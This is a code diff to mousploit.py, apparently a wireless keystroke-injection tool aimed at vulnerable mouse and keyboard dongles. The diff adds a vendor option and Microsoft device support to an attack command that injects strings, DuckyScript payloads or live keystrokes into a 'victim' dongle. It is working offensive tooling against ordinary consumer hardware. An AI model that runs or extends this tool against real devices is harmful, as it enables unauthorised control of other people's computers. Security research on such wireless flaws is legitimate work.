@@ -10,6 +10,7 @@ from utils.script_parser import *
 from utils.scan import *
 from utils.sniff import *
 from utils.live_mode import *
+from utils.vendors import microsoft
 
 NUM_RETRIES = 5 # number of allowed retries beyond which we give up finding the channel
 
@@ -26,7 +27,7 @@ required commands:
     sniff              Sniff packets from a specific device
 
 commands usage:
-usage: mousploit.py attack [-h] [--address ADDRESS] (--string STRING | --script-file SCRIPT_FILE | --live-mode)
+usage: mousploit.py attack [-h] [--address ADDRESS] [--vendor VENDOR] (--string STRING | --script-file SCRIPT_FILE | --live-mode)
 usage: mousploit.py scan [-h] [--duration DURATION]
 usage: mousploit.py sniff [-h] [--address ADDRESS] [--duration DURATION]
 """
@@ -42,6 +43,7 @@ def main():
 
     # defining arguments for "attack"
     attack_cmd.add_argument("--address", type=str, required=False, default="E4:ED:AE:B8:B4", help="RF address of a vulnerable device")
+    attack_cmd.add_argument("--vendor", type=str, required=False, default="logitech", help="Vendor of vulnerable device")
     group = attack_cmd.add_mutually_exclusive_group(required=True) # either a string, a script file path or live mode must be specified, but only one of them
     group.add_argument("--string", type=str, help="A string of characters to be injected into the target") # if the string contains whitespaces, it must be surrounded with DOUBLE quotes
     group.add_argument("--script-file", type=str, help="Path of a DuckyScript file")
@@ -77,15 +79,22 @@ def main():
             print("Failed to find frequency channel. Tell the agent to try getting closer to the victim dongle.")
             sys.exit(1)
 
+        vendor = globals()[args.vendor] # globals() returns a dictionary containing all modules in the program, so given a vendor string we can get its module
+        if vendor == microsoft:
+            # Unlike Logitech for example, attacking Microsoft devices requires knowing their address beyond the call to enter_sniffer_mode above,
+            # since it determines the packet structure (see microsoft.py). So we pass it to the microsoft module at this stage rather than
+            # having to add a parameter to all attack functions below.
+            microsoft.init(args.address)
+
         if args.string:
             print(f"Injecting the string: \"{args.string}\" into the target dongle paired to the device with address: {args.address}")
-            transmit_string(radio_server, args.string)
+            transmit_string(radio_server, args.string, vendor)
         elif args.script_file:
             print(f"Injecting the DuckyScript at: {args.script_file} into the target dongle paired to the device with address: {args.address}")
-            parse_script_file(radio_server, args.script_file)
+            parse_script_file(radio_server, args.script_file, vendor)
         elif args.live_mode:
             print("Entered Live mode: Press any key to transmit it to the victim, press Esc to stop.")
-            live_mode(radio_server)
+            live_mode(radio_server, vendor)
 
     elif args.command == "scan":
         print(f"Scanning for {args.duration} seconds...")
